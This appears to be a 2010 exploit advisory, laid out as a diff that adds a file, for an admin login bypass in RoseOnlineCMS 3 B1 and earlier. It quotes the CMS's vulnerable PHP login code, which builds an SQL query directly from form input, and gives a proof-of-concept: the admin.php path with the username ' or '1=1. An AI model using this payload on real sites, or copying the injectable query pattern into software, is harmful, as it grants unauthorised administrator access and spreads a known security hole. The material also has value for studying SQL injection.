@@ -1,0 +1,69 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo-------------------
+   |  RoseOnlineCMS <= 3 B1 Remote Login Bypass Exploit |
+   |      (works only with magic_quotes_gpc = off)      |
+   ------------------------------------------------------
+
+[!] Discovered: cr4wl3r <cr4wl3r[!]linuxmail.org>
+[!] Download: http://sourceforge.net/projects/rosecms/files/
+[!] Date: 16.01.2010
+[!] Remote: yes
+
+[!] Code :
+
+
+<form action="<?php $PHP_SELF; ?>" method="post">
+
+  <div align="center">
+    <table width="295" border="0">
+      <tr>
+        <td width="64">Username:</td>
+        <td width="215">
+          <label>
+          <input name="user" type="text" id="user">
+          </label>        </td>
+      </tr>
+      <tr>
+        <td>Password:</td>
+        <td>          <input name="pass" type="text" id="pass">        </td>
+      </tr>
+    </table>
+  </div>
+  <p align="center">
+    <em>
+    <input name="submit" type="submit" id="submit" value="Login">
+    </em>
+</form>
+</p>
+<?php
+if(isset($_POST['submit'])) {
+
+
+// username and password sent from signup form
+$USER = $_POST['user'];
+$PASS = md5($_POST['pass']);
+
+$sql = "SELECT * FROM `accounts` WHERE username='$USER' and password='$PASS' and accesslevel = '300'";
+$result = mysql_query($sql);
+
+// Mysql_num_row is counting table row
+$count = mysql_num_rows($result);
+// If result matched $myusername and $mypassword, table row must be 1 row
+
+if($count == 1){
+// Register $user, $pass and redirect to file ?op=admin
+session_register("USER");
+session_register("PASS");
+echo('Logged in: <a href=?op=admincp>Click here</a> to go to the control panel.');
+}
+else {
+echo "You are banned, or you are an user with no permission to enter.";
+}
+}
+?>
+
+[!] PoC: [RoseOnlineCMS_path]/modules/admin.php
+
+    username : ' or '1=1
+    password : cr4wl3r
